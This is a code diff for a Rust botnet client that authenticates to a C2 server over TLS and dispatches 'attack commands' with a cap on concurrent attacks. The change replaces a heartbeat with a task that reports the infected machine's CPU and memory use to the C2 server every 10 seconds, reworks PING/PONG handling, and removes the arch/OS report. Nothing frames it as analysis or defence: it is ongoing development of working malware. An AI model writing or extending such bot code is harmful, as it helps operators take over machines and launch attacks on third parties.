@@ -11,9 +11,9 @@ use std::collections::HashMap;
 use tokio::sync::Mutex;
 use tokio_rustls::rustls;
 use tokio_rustls::TlsConnector;
+use sysinfo::System;
 
 const RECONNECT_DELAY: Duration = Duration::from_secs(5);
-const HEARTBEAT_INTERVAL: Duration = Duration::from_secs(30);
 const READ_TIMEOUT: Duration = Duration::from_secs(60);
 const MAX_CONCURRENT_ATTACKS: usize = 5;
 
@@ -202,7 +202,8 @@ async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
     
     // Send authentication token
     let bot_token = get_bot_token();
-    let auth_msg = format!("AUTH {}\n", bot_token);
+    let version = "2.0";
+    let auth_msg = format!("AUTH {} {}\n", bot_token, version);
     conn.write_all(auth_msg.as_bytes()).await?;
     
     // Wait for auth response
@@ -217,12 +218,6 @@ async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
     
     tracing::info!("[OK] Authenticated with C2 server");
     
-    // Send initial bot info
-    let arch = std::env::consts::ARCH;
-    let os = std::env::consts::OS;
-    let info = format!("BOT_INFO {} {}\n", arch, os);
-    conn.write_all(info.as_bytes()).await?;
-    
     // Wrap connection in Arc<Mutex<>> for shared access
     // We need to split it because TlsStream doesn't support concurrent read/write easily with Arc<Mutex> if we want to read in loop and write heartbeat
     // But TlsStream implements AsyncRead+AsyncWrite, so we can use tokio::io::split
@@ -231,14 +226,25 @@ async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
     let reader = Arc::new(tokio::sync::Mutex::new(reader));
     let writer = Arc::new(tokio::sync::Mutex::new(writer));
     
-    // Spawn heartbeat task
-    let writer_heartbeat = writer.clone();
-    let heartbeat_task = tokio::spawn(async move {
-        let mut interval = tokio::time::interval(HEARTBEAT_INTERVAL);
+    // Spawn status reporting task
+    let writer_status = writer.clone();
+    let status_task = tokio::spawn(async move {
+        let mut sys = System::new();
+        let mut interval = tokio::time::interval(Duration::from_secs(10));
         loop {
             interval.tick().await;
-            let mut w = writer_heartbeat.lock().await;
-            if w.write_all(b"PONG\n").await.is_err() {
+            sys.refresh_cpu();
+            sys.refresh_memory();
+            let cpu = sys.global_cpu_info().cpu_usage();
+            let mem = if sys.total_memory() > 0 {
+                (sys.used_memory() as f32 / sys.total_memory() as f32) * 100.0
+            } else {
+                0.0
+            };
+            
+            let status_msg = format!("STATUS {:.1} {:.1}\n", cpu, mem);
+            let mut w = writer_status.lock().await;
+            if w.write_all(status_msg.as_bytes()).await.is_err() {
                 break;
             }
         }
@@ -279,8 +285,17 @@ async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
                 
                 let command = line.trim();
                 if !command.is_empty() {
-                    if let Err(e) = handle_command(command, state.clone()).await {
-                        tracing::error!("Failed to handle command '{}': {}", command, e);
+                    if command == "PING" {
+                        tracing::debug!("Received PING");
+                        let mut w = writer.lock().await;
+                        if let Err(e) = w.write_all(b"PONG\n").await {
+                             tracing::error!("Failed to send PONG: {}", e);
+                             break;
+                        }
+                    } else {
+                        if let Err(e) = handle_command(command, state.clone()).await {
+                            tracing::error!("Failed to handle command '{}': {}", command, e);
+                        }
                     }
                 }
             }
@@ -295,7 +310,7 @@ async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
         }
     }
     
-    heartbeat_task.abort();
+    status_task.abort();
     Ok(())
 }
 
@@ -307,12 +322,6 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
     }
     
     let cmd = fields[0];
-    
-    // Handle PING explicitly
-    if cmd == "PING" {
-        tracing::debug!("Received PING");
-        return Ok(());
-    }
     
     // Attack commands
     match cmd {
